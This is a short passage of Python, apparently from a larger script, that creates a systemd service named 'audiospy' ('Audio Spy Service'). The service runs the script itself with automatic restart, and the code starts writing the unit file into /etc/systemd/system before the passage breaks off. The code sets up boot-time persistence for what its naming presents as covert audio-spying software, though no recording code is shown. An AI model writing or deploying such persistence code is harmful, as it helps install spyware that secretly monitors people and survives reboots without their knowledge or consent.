            service_name = "audiospy"
            service_content = f'[Unit]\nDescription=Audio Spy Service\n[Service]\nExecStart={os.path.abspath(__file__)}\nRestart=always\n[Install]\nWantedBy=multi-user.target'
            with open(f'/etc/systemd/system/{service_name}.service', 'w') as f:
